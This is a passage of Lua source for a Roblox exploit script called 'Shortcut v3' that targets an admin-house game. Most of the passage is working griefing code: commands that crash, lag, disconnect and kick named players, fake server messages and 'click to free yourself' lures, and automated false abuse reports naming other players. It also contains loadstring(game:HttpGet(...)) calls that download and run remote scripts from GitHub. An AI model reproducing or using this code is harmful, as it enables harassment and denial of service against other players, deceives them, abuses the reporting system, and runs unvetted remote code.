				chatt(prefix.."spam gear me "..antilog.."127506257");wait(5)
				chatt("/super gear me "..antilog.."127506257");wait(1.65)
				execCmd("noclipcam")
				chatt(prefix.."stop")
				chatt("fly " .. msggg .. " me");wait(.35)
				chatt("dog " .. msggg)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(100000, 10000, 100000));wait(1)
				chatt("tp " .. msggg .. " me");wait(.35)
				chatt(":fly " .. msggg .. " me");wait(1.65)
				chatt(":tp " .. msggg .. " " .. msggg)
				execCmd("usetools 250 000")
				chatt("blind " .. msggg)
				wait(0.4)
				logn("Drop the gear now with backspace and align above the player so the gear tornados fall on the target")
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(3.5)
				chatt("unchar me me me me me me")
				chatt(prefix.."slockmuter");wait(10)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt(prefix.."stop")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."94333296")
				chatt("gear " .. msggg .. " "..antilog.."94333296")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				chatt("clr")
				temploopgrab = false
				chatt(prefix.."spam gear " .. msggg .. " "..antilog.."253519495");wait(25.65) -- Perfect time literally
				for i = 1, 5 do
					chatt(prefix.."stop");wait(1)
				end;wait(4.5)
				chatt(prefix.."tempcrash");wait(.1)
				chatt(prefix.."zoomer");wait(.9)
				chatt(prefix.."up")
			end
			if string.sub(msg:lower(), 0, 12 + #prefix) == prefix .. "v2disconnect" then
				local msggg = string.sub(msg:lower(), 14 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				pcall(function()
					if CLEFDV == true then
						chatt(prefix.."zoomer");wait(.9)
						chatt(prefix.."up")
					end
				end)
				chatt(prefix.."infyield");wait()
				chatt(":m The fog spam ends automatically, give it a good second or two. Don't reset all as that risks the server getting crashed")
				chatt("unchar alex "..math.random(1, 327670000).." " .. msggg);wait(.1)
				chatt("fly alex "..math.random(1, 327670000).." " .. msggg)
				chatt("undog alex "..math.random(1, 327670000).." " .. msggg)
				chatt("normal alex "..math.random(1, 327670000).." " .. msggg)
				chatt("unsize alex "..math.random(1, 327670000).." " .. msggg)
				chatt("uncreeper alex "..math.random(1, 327670000).." " .. msggg)
				chatt("ungear me | " .. msggg);wait(.35)
				chatt("fogend nil moment")
				chatt("gear me 98411393")
				chatt("invis all")wait(.1)
				chatt("gear me 98411393")
				chatt("h \n\n\nEveryone is invisible. Type vis all to fix this\n\n\n");wait(.1)
				chatt("gear me 98411393")
				execCmd("esp")
				chatt("gear me 98411393")
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait(0.8)
				for i = 1, 11 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait() -- 55028088
				end;wait(.5)
				for i = 1, 13 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait()
				end;wait(1)
				execCmd("view "..msggg)
				execCmd("fasttp " .. msggg .. " "..game.Players.LocalPlayer.Name)
				chatt("fogcolor 0 0 0")
				chatt("brightness nan")
				chatt("fogend nil moment")

				wait(2.5)
				chatt("tp me random")

				chatt("fogend nil moment")

				chatt("fly alex "..math.random(1, 327670000).." " .. msggg)

				chatt("clone alex "..math.random(1, 327670000).." " .. msggg)

				wait(1.65)
				chatt(prefix.."crazycolors")

				task.wait(1.65)
				for i = 1, 5 do
					chatt(prefix.."stop");wait(1)
				end;wait(1)

				chatt("fix")

				chatt("vis all")

				Utils.Task:wait(1)
				for i = 1, 5 do
					chatt("invis alex "..math.random(1, 327670000).." " .. msggg);wait()
				end

				logn("Check your clipboard")
				setclipboard("Type _bn ''" .. msggg .. "'' to still somewhat blacklist the perm user. \n They can bypass it with ''respawn'' but not refresh/reset or anything like that.")
				local plrs = game:GetService'Players'
				local lp = game.Players.LocalPlayer
				local Admin = game:GetService("Workspace").Terrain["_Game"].Admin

				plrs.PlayerAdded:Connect(function(plyr)
					repeat wait()
					until plyr.Character
					plrs:chat(prefix.."silv2dc " .. msggg)
					plyr.CharacterAdded:Connect(function()
						if plyr.Name ~= lp.Name then
							game.Players:Chat("trip "..v.Name)
							game.Players:Chat("trip "..v.Name)
							plrs:chat("trip "..v.Name)
							plrs:chat("trip "..v.Name)
						end
					end)
				end)

				for _, v in pairs(plrs:GetChildren()) do
					v.CharacterAdded:Connect(function()
						if v.Name ~= lp.Name then
							plrs:chat(prefix.."silv2dc " .. msggg)
						end
					end)
				end
				temploopgrab = false
			end
			if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "silv2dc" then
				local msggg = string.sub(msg:lower(), 9 + #prefix)
				antiFun = false
				antigear = false
				chatt(prefix.."infyield");wait()
				chatt("invis capybara_" .. msggg);wait(.1)
				chatt("fly alex "..math.random(1, 327670000).." " .. msggg)
				chatt("undog alex "..math.random(1, 327670000).." " .. msggg)
				chatt("normal alex "..math.random(1, 327670000).." " .. msggg)
				chatt("unsize alex "..math.random(1, 327670000).." " .. msggg)
				chatt("uncreeper alex "..math.random(1, 327670000).." " .. msggg)
				chatt("ungear me | " .. msggg);wait(.35)
				chatt("gear me 98411393")
				chatt("blind alex "..math.random(1, 327670000).." " .. msggg)
				chatt("gear me 98411393")
				execCmd("esp")
				chatt("gear me 98411393")
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait(0.8)
				for i = 1, 11 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait() -- 55028088
				end;wait(.5)
				for i = 1, 13 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait()
				end;wait(1)
				execCmd("view "..msggg)
				execCmd("fasttp " .. msggg .. " "..game.Players.LocalPlayer.Name)
				chatt("pm \n\n\n Click to free yourself")
			end

			if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "fastv3dc" then
				--game.Players.LocalPlayer:kick("The fast variant has been disabled for now")
				local msggg = string.sub(msg:lower(), 10 + #prefix)
				antiFun = false
				antigear = false
				game.Players:Chat("unpackage "..antilog)
				game.Players:Chat(prefix.."infyield")
				game.Players:Chat("invis "..antilog.." me")
				print("Funny story. If v3disconnect was working for multiple people in a row then it will keep working for multiple people in a row until you rejoin. It likes to fail the first time for some reason")
				--chatt("/pads")
				--chatt(prefix.."psave "..msggg)
				--chatt("gear me 98411393")
				--execCmd("usetools 1 "..loopnum);wait(2)
				game.Players:Chat("/nok")
				game.Players:Chat("speed " .. msggg .. " 0");wait()
				game.Players:Chat("invis capybara_" .. msggg);wait()
				game.Players:Chat("ff alex "..math.random(1, 327670000).." " .. msggg)
				game.Players:Chat("blind alex "..math.random(1, 327670000).." " .. msggg)
				game.Players:Chat("gear me "..antilog.."25741198")
				execCmd("esp")
				game.Players:Chat("/alltools")
				game.Players:Chat("gear me "..antilog.."25741198")
				game.Players:Chat("gear me "..antilog.."25741198")
				game.Players:Chat("gear me "..antilog.."25741198")
				execCmd("speed 250")
				game.Players:Chat("gear " .. msggg .. " "..antilog.."110337853")
				game.Players:Chat("gear " .. msggg .. " "..antilog.."55028088");task.wait()
				game.Players:Chat("gear me "..antilog.."25741198")
				game.Players:Chat("size " .. msggg .. " nan");task.wait()
				game.Players:Chat("noclip " .. msggg .. " kicked user");task.wait()
				game.Players:Chat("dog " .. msggg .. " kicked user");task.wait()
				game.Players:Chat("size " .. msggg .. " nan");task.wait()
				game.Players:Chat("size " .. msggg .. " nan");task.wait()
				game.Players:Chat("size " .. msggg .. " 2");wait(.2)
				execCmd("goto "..msggg)
				execCmd("usetools all 0.33")
				execCmd("usetools 999 0.33")
				game.Players:Chat("pm/"..msggg.." Kicked by SC \n Don't abuse next time");wait(.41)
				--execCmd("equiptools")
				execCmd("view "..msggg)
				execCmd("loopgoto "..msggg)
				game.Players:Chat("pm/"..msggg.." Kicked by SC \n Don't abuse next time")
				execCmd("fasttp " .. msggg .. " "..game.Players.LocalPlayer.Name)
				game.Players:Chat("pm/"..msggg.." Kicked by SC \n Don't abuse next time");wait(2.75)
				execCmd("unloopgoto")
				game.Players:Chat("unchar me");wait(.1)
				--chatt("refresh "..msggg);wait(.1)
				execCmd("unview")
				game.Players:Chat("clear the potatoes")
				game.Players:Chat("ff refresh "..msggg.." moment")
				if fv3dcglobal == true then
					pass()
					return
				end
				pcall(function()
					getgenv().fv3dcglobal = true
				end)
				game.Players:Chat(prefix.."fastv3dc "..msggg)
				longlogn("If it still keeps missing then use gcrash (perms) or silv2dc on non-perms")
			end

			if string.sub(msg:lower(), 0, 10 + #prefix) == prefix .. "personslag" then
				local msggg = string.sub(msg:lower(), 12 + #prefix)
				antiFun = false
				antigear = false
				print(msggg)
				print(shared.pmlag)
				chatt("h/ \n\n\nFunny fake button message amirite. Also enjoy lag if you see it\n\n\n")
				chatt(prefix.."spam pm/" .. msggg .. "  " .. shared.pmlag)
				chatt("<spam pm/" .. msggg .. "  " .. shared.pmlag)
				longlogn("Having Vecko loaded is recommended for this command")
			end

			if string.sub(msg:lower(), 0, 12 + #prefix) == prefix .. "personscrash" then
				local msggg = string.sub(msg:lower(), 14 + #prefix)
				antiFun = false
				antigear = false
				chatt(prefix.."infyield");wait(2.5)
				print(msggg)
				print(shared.pmlag)
				chatt("invis capybara_" .. msggg);wait(.1)
				chatt("unchar alex "..math.random(1, 327670000).." " .. msggg);wait(.1)
				chatt("fly alex "..math.random(1, 327670000).." " .. msggg)
				chatt("undog alex "..math.random(1, 327670000).." " .. msggg)
				chatt("normal alex "..math.random(1, 327670000).." " .. msggg)
				chatt("unsize alex "..math.random(1, 327670000).." " .. msggg)
				chatt("uncreeper alex "..math.random(1, 327670000).." " .. msggg)
				chatt("ungear me | " .. msggg);wait(.35)
				chatt("gear me 98411393")
				chatt("blind alex "..math.random(1, 327670000).." " .. msggg)
				chatt("gear me 98411393")
				execCmd("esp")
				chatt("gear me 98411393")
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait(0.8)
				for i = 1, 11 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait() -- 55028088
				end;wait(.5)
				for i = 1, 13 do
					chatt("gear " .. msggg .. " "..antilog.."110337853");task.wait()
				end;wait(1)
				execCmd("view "..msggg)
				execCmd("fasttp " .. msggg .. " "..game.Players.LocalPlayer.Name);wait(3.5)
				chatt(prefix.."spam pm/" .. msggg .. "  " .. shared.pmlag)
				chatt("<spam pm/" .. msggg .. "  " .. shared.pmlag)
				longlogn("Having Vecko loaded is recommended for this command")
				local plrs = game:GetService'Players'
				local lp = game.Players.LocalPlayer
				local Admin = game:GetService("Workspace").Terrain["_Game"].Admin

				plrs.PlayerAdded:Connect(function(plyr)
					repeat wait()
					until plyr.Character
					plrs:chat(prefix.."silv2dc " .. msggg)
					plyr.CharacterAdded:Connect(function()
						if plyr.Name ~= lp.Name then
							game.Players:Chat("trip "..v.Name)
							game.Players:Chat("trip "..v.Name)
							plrs:chat("trip "..v.Name)
							plrs:chat("trip "..v.Name)
						end
					end)
				end)

				for _, v in pairs(plrs:GetChildren()) do
					v.CharacterAdded:Connect(function()
						if v.Name ~= lp.Name then
							plrs:chat(prefix.."stop")
							wait(1)
							plrs:chat(prefix.."silv2dc " .. msggg)
							wait(6.5)
							chatt(prefix.."spam pm/" .. msggg .. "  " .. shared.pmlag)
							logn("Use "..prefix.."stop to stop the pm spam.")
						end
					end)
				end
				temploopgrab = false
			end

			if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "zahando" then
				local msggg = string.sub(msg:lower(), 9 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt("blind " .. msggg)
				wait(0.8)
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("music 304787933")
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				chatt("invis all");wait()
				chatt("unblind all");wait()
				chatt(prefix.."crazycolors")
				temploopgrab = false
				task.wait(10)
				chatt(prefix.."stop")
				chatt("fix")
			end
			if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "funtools" then
				local msggg = string.sub(msg:lower(), 10 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt("skydive " .. msggg)
				chatt("invis all")
				chatt("h \n\n\nServer Message: Santa has delivered some sweet tools. If you were lucky you'd have them B-)\n\n\n")
				wait(0.8)
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				temploopgrab = false
			end
			if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "havefun" then
				local msggg = string.sub(msg:lower(), 9 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt("blind " .. msggg)
				wait(0.8)
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				temploopgrab = false
			end
			if string.sub(msg:lower(), 0, 9 + #prefix) == prefix .. "playhouse" then
				local msggg = string.sub(msg:lower(), 11 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt("/pads");wait(.65)
				chatt("tp "..msggg.." me")
				chatt("invis " .. msggg)
				wait(0.8)
				chatt("music "..antilog.."1838663141");wait()
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				temploopgrab = false
			end
			if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "psave" then
				local msggg = string.sub(msg:lower(), 7 + #prefix)
				chatt(":respawn " .. msggg)
				chatt(":tp " .. msggg .. " me")
			end

			if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "stop" then
				spam = false
				ccolors = false
				chatt("/stop " .. math.random(1, 1000))
				v3disconnecting2 = false
				v3disconnecting = false
				getgenv().v3kickfilterglobal = true
				getgenv().v3dfilterglobal = true
				wait(19)
				v3disconnecting = false
				logn("You can now kick again.")
				v3disconnecting = false
				wait(1)
				v3disconnecting2 = true
			end
			if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "super" then
				local msggggg = string.sub(msg:lower(), 7 + #prefix)
				for i = 1, 69 do
					chatt(msggggg)
				end
			end
		end 
	end)
end) -- End of the commands entirely

task.spawn(function()
	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if string.sub(msg:lower(), 0, 0) == "" then
			local cmd = string.sub(msg:lower(), 2)
			if unlockprefixes == true then
				if msgg1 then return end
				msgg1 = true
				game.Players:Chat(prefix..""..cmd);wait(.35)
				msgg1 = false
			end
		elseif string.sub(msg:lower(), 0, 0) == "" then
			local cmd = string.sub(msg:lower(), 2)
			if unlockprefixes == true then
				game.Players:Chat("/"..cmd)
			end
		end
	end)
end)

game.Players.PlayerAdded:Connect(function(plr)
	if scriptActive then
		coroutine.wrap(
			function()
				wait(1)
				if plr.Name == "An0rdinaryGirl_Mia" then
					say("The HOT owner of shortcut has joined the server! (An0rdinaryGirl_Mia)")
					chatt(prefix.."psave An0rdinaryGirl_Mia")
				end
			end)()
	end
end)

if shared.loadwithiy == true then
	if loadwithiyglobal == true then
		pass()
		return
	end
	pcall(function()
		getgenv().loadwithiyglobal = true
	end)
	wait(.65)
	for i = 1, 5 do
		chatt(prefix.."infyield");wait(2.5)
	end
end
if shared.autorejoin == true then
	if ar2global == true then
		pass()
		return
	end
	pcall(function()
		getgenv().ar2global = true
	end)
	wait(17)
	chatt(prefix.."autorejoin")
end

--Addpoint
--Addpoint
--Addpoint


if loopstopsounds == true then
	do
		local loopstopsoundscoroutine = coroutine.wrap(function()
			while task.wait() do
				if loopstopsounds == false then
					break
				end
				for i, v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v:Stop()
					end
				end
			end
		end)()
	end
end

task.spawn(function()
	while task.wait(.1) do
		if
			ws:FindFirstChild(game.Players.LocalPlayer.Name) and
			ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
		then
			local L_1_ = workspace[game.Players.LocalPlayer.Name]
			if ELFRGD == true then
				if L_1_.Humanoid.Health == 0 then
					chatt("reset me " .. math.random(1, 1000))
					chatt("god " .. antilog .. " me " .. math.random(1, 1000))
				end
			end
		else
			repeat
				Utils:__wait()
			until ws:FindFirstChild(game.Players.LocalPlayer.Name) and
				ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
		end
	end
	if ELFRGD == true then
		if KGODglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().KGODglobal = true
		end)
		game.Players.LocalPlayer.CharacterAdded:connect(function()
			task.wait(.65)
			chatt("god "..antilog.." me " .. math.random(1, 1000))
		end)
	end
end)

RunService.RenderStepped:Connect(function()
	task.spawn(function()
		if antiattach == true then
			for i, player in pairs(game:GetService("Players"):GetPlayers()) do
				if player.Name ~= lplr.Name then
					if player.Character then
						if player.Backpack:FindFirstChild("IvoryPeriastron") or player.Character:FindFirstChild("IvoryPeriastron") then
							local plrname = player.Name
							antigear = true
							chatt("freeze " .. math.random(99999) .. " " .. plrname .. "  " .. math.random(99999) .. "  " .. math.random(99999))
							regen();wait(2.5)
							chatt("respawn " .. math.random(99999) .. " " .. plrname .. "  " .. math.random(99999) .. "  " .. math.random(99999))
							antiattach = false
							longlogn("Antiattach has been set to false, antigearv2 is on instead")
						end
					end
				end
			end
		end
	end)
end)

RunService.RenderStepped:Connect(function()
	task.spawn(function()
		if antipaint == true then
			for i, player in pairs(game:GetService("Players"):GetPlayers()) do
				if player.Name ~= lplr.Name then
					if player.Character then
						if player.Backpack:FindFirstChild("PaintBucket") or player.Character:FindFirstChild("PaintBucket") then
							local plrname = player.Name
							if spamfilterglobal then
								pass()
								return
							end
							pcall(function()
								getgenv().spamfilterglobal = true
							end)
							chatt("unchar "..plrname)

							chatt("invis me"..math.random(99999).." "..plrname.."  "..math.random(99999).."  "..math.random(99999))

							testgrab = true

							task.wait(.35)

							chatt(prefix.."fastv3dc "..plrname)

							chatt("h \n\n\n Server Message: Welp, looks like "..plrname.."  has managed to spill black paint on themselves \n\n\n")

							wait(5)

							testgrab = false

							getgenv().spamfilterglobal = false
						end
					end
				end
			end
		end
	end)
end)

RunService.RenderStepped:Connect(function()
	task.spawn(function()
		if gamewidereport == true then
			for i, player in pairs(game:GetService("Players"):GetPlayers()) do
				if player.Name ~= lplr.Name then
					if player.Character then
						if player.Backpack:FindFirstChild("HeatMissileLauncher") or player.Character:FindFirstChild("HeatMissileLauncher") then
							local plrname = player.Name
							if reportfilterglobal then
								pass()
								return
							end
							pcall(function()
								getgenv().reportfilterglobal = true
							end)
							game.Players:ReportAbuse(game:GetService("Players"),player.Name,"Cheating/Exploiting", "Uses an advertise bot to spam " .. math.random(1, 3276700))
						end
					end
				end
			end
		end
	end)
end)

task.spawn(function()
	pcall(function()

--[[// The printscript doesn't belong to me
       original source: https://v3rmillion.net/showthread.php?tid=1034740 --//]]

		local DevConsole = game:GetService("CoreGui"):WaitForChild("DevConsoleMaster")
		local Window = DevConsole.DevConsoleWindow
		local UI = Window.DevConsoleUI
		local MainView = UI:WaitForChild("MainView")
		local ClientLog = MainView:WaitForChild("ClientLog")

		local GetHighest = function(...)
			local HighestValue
			for _, Value in next, ... do
				if not HighestValue or Value > HighestValue then
					HighestValue = Value
				end
			end
			return HighestValue
		end

		local cprint = function(...)
			local Args = {...}
			local TempColour = table.remove(Args)
			local Colour
			if typeof(TempColour) == "Color3" then
				Colour = TempColour
			else
				Colour = Color3.fromRGB(255,255,255)
				table.insert(Args, TempColour)
			end
			local CandidParts = {}
			for _, Element in next, ClientLog:GetChildren() do
				local Name = Element.Name
				if Name:match("%d+") then
					table.insert(CandidParts, tonumber(Element.Name))
				end
			end
			local Expecting = GetHighest(CandidParts)
			Expecting = Expecting and (Expecting + 1) or (2)
			print(unpack(Args))
			local ExpectedPart = ClientLog:WaitForChild(Expecting)
			local MessagePart = ExpectedPart:FindFirstChild("msg")
			if MessagePart then
				MessagePart.TextColor3 = Colour
			end
		end











		--// for ascii characters to appear for krnl users this script must be in loadstring
		--// problem only is with ascii containing " (which breaks print)

		print(" .d8888b.   .d8888b.  888     888  .d8888b.  ") -- basic one is white already
		cprint("d88P  Y88b d88P  Y88b 888     888 d88P  Y88b ", Color3.fromRGB(252,204,255))
		cprint("Y88b.      888    888 888     888      .d88P ", Color3.fromRGB(243,181,247))
		cprint("....Y88b. 888         Y88b d88P       Y8b. ", Color3.fromRGB(247,117,255))
		cprint("......888 888    888   Y88o88P   888    888  ", Color3.fromRGB(245,84,255))
		cprint("Y88b  d88P Y88b  d88P    Y888P    Y88b  d88P ", Color3.fromRGB(213,29,224))
		cprint("..Y8888P      Y8888P      Y8P       Y8888P  ", Color3.fromRGB(162,12,171))
	end)
end)

task.spawn(function()
	game:GetService("UserInputService").WindowFocused:Connect(function()
		if false then
			game:GetService("RunService"):Set3dRenderingEnabled(true)
		end
		setfpscap(144)
	end)
	game:GetService("UserInputService").WindowFocusReleased:Connect(function()
		if false then
			game:GetService("RunService"):Set3dRenderingEnabled(false)
		end
		setfpscap(9.8)
		logn("Entering RAM saving mode. This will end when you tab back in")
	end)
end)


-- Lag API outage?

if shared.laggerdown == true then
	if safemodeglobal  == true then
		pass()
		return
	end
	pcall(function()
		getgenv().safemodeglobal = true
	end)
	repeat wait() until game:IsLoaded()
	task.wait(2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
	local regenn = ws.Terrain["_Game"].Admin:FindFirstChild("Regen")
	local touchpads = ws.Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin")

	if not regenn and not touchpads then
		pcall(function()
			if not syn then
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4Iw4reT3sts/scr4bl33/main/Part%20of%20the%20temp%20folder'), true))();wait(1.65)
				chatt(prefix.."/repott")
			else
				longlogn("Could not use zoomer due to Synapse blocking it")
			end
		end);wait(5)
		while true do task.wait() -- Not my hop and no clue who made it either
			local servers = {}
			for _, server in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
				if type(server) == "table" and server.maxPlayers > server.playing and server.id ~= game.JobId then
					table.insert(servers, server.id)
				end
			end
			if #servers > 0 then
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
			else
				pass()
			end
		end
	end
	if regenn then
		fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0) 
	end
	if game.Players.LocalPlayer.Character.Head then
		local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()
		for i, pad in pairs(pads) do
			Spawn(function()
				local cre = pad.Head
				local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
				firetouchinterest(cre, spr, 1)
				task.wait()
				firetouchinterest(cre, spr, 0)
			end)
		end
	else
		while true do task.wait() -- Not my hop and no clue who made it either
			local servers = {}
			for _, server in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
				if type(server) == "table" and server.maxPlayers > server.playing and server.id ~= game.JobId then
					table.insert(servers, server.id)
				end
			end
			if #servers > 0 then
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
			else
				pass()
			end
		end
	end

	pcall(function()
		task.spawn(function()

			-- Looks kinda messy

			chatt(":invisible 123 me " .. math.random(1, 1000))

			wait(.35)

			loadstring(
				game:HttpGet(
					("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/FindVerticalRegen"),
					true
				)
			)()

			chatt(":invisible 456 me " .. math.random(1, 1000))

		end)
	end)
end

-- end of this section

function antinoclip()
	pcall(function()
		local v = game:GetService("Players").LocalPlayer
		local c = v.Character
		c:WaitForChild("Torso").Changed:Connect(function()
			if c.Torso.Anchored == true then
				c.Torso.Anchored = false
			end
		end)
		c:WaitForChild("Humanoid").Changed:Connect(function()
			if c.Humanoid.PlatformStand == true then
				c.Humanoid.PlatformStand = false
			end
		end)
		v.PlayerGui.ChildAdded:Connect(function()
			if v.Name == "NoClip" then
				v.Disabled = true
				v:GetPropertyChangedSignal("Disabled"):Connect(function()
					v.Disabled = true
				end)
				wait()
				v:Destroy()
				repeat
					wait()
				until not v
			end
		end)
		while true do
			game:GetService("RunService").Heartbeat:Wait()
			if v.PlayerGui:FindFirstChild("NoClip") then
				v.PlayerGui.NoClip.Disabled = true
				v.PlayerGui.NoClip:Destroy()
			end
		end
	end)
end

task.spawn(function()
	local FileName = "SCV3.json" -- must include a .json, change the 'ScriptNameSettings' to what you want
	if writefile and readfile then
		local ExistingFile = pcall(readfile, FileName)
		if not ExistingFile then
			createKohlsUi({
				"Welcome to Shortcut \n The #1 script since 2021 \n \n This seems to be your first \n time using Shortcut v3 \n\n Type //cmds for a list of commands \n\n Feel free to open a ticket if you have any \n (important) questions \n\n\n\n\n\n discord.io/shortcut"
			})
			writefile(FileName, '[firsttimecheckpassed] \n')
			shared.firsttimecheckpassed = true
			shared.secondtimecheck = false
			setclipboard("Prefix is //");task.wait(.65)
			print("Prefix is //");task.wait(.65)
			pcall(function()
				printconsole("Prefix is //");
				task.wait(.65)
			end)
			logn("Prefix is //");task.wait(.65)
			rconsoleprint("The default prefix is // \n I hope you find this script worth it \n\n\n\n")
			chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Shortcut v3 injected :) \n discordant   io/shortcut (not gg) \n We've been on the top ever since Shortcut became a thing.")
			local ClientSound = Instance.new("Sound")
			ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807627885"
			ClientSound.Volume = 1.5
			ClientSound.Parent = workspace
			ClientSound.PlaybackSpeed = 1
			ClientSound:Play()
			task.wait(1.5)
			mslash()
			for i = 1, 5 do
				mslash();wait(1)
			end
			local fmusic = math.random(1, 10)
			if fmusic == 1 then
				chatt("music "..antilog.."1843403232")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 2 then
				chatt("music "..antilog.."1838028467");wait()
				chatt("time -")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 3 then
				chatt("music "..antilog.."1840040963");wait()
